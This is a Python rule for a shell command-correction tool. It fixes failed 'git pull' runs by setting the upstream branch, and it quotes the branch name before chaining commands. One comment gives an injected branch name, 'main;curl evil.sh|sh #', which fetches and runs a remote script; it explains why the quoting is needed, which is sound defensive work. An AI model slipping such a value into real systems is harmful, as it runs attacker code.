from thebleep.shells import shell
from thebleep.specific.git import git_support
from thebleep.utils import quote_words


# The subcommand, as a *word*. `'pull' in command.script` also matched
# `git config pull.rebase true` and `git log --grep=pull`, neither of which has
# an upstream to set.
@git_support
def match(command):
    return ('pull' in command.script_parts
            and 'set-upstream' in command.output
            and _set_upstream_line(command) is not None)


def _set_upstream_line(command):
    """git's own `git branch --set-upstream-to=...` line, or `None`.

    Found by looking for it rather than by counting three lines back from the
    end. `split('\n')[-3]` is right against what `rerun` hands over and wrong
    by one against what `read_log` does, because one of the two readers strips
    the output and the other does not -- so the same failure was corrected in
    instant mode and not in the other, or the other way about, depending on how
    many newlines git happened to print.

    """
    for line in command.output.split('\n'):
        stripped = line.strip()
        if stripped.startswith('git branch --set-upstream-to='):
            return stripped

    return None


@git_support
def get_new_command(command):
    line = _set_upstream_line(command)
    if line is None:
        return []

    branch = line.split(' ')[-1]
    set_upstream = line.replace('<remote>', 'origin')\
                       .replace('<branch>', branch)
    # The branch name arrives here twice -- in `--set-upstream-to=origin/<branch>`
    # and on its own -- and it comes from the repository, which is allowed to
    # name a branch `main;curl evil.sh|sh #`.
    return shell.and_(quote_words(set_upstream), command.script)
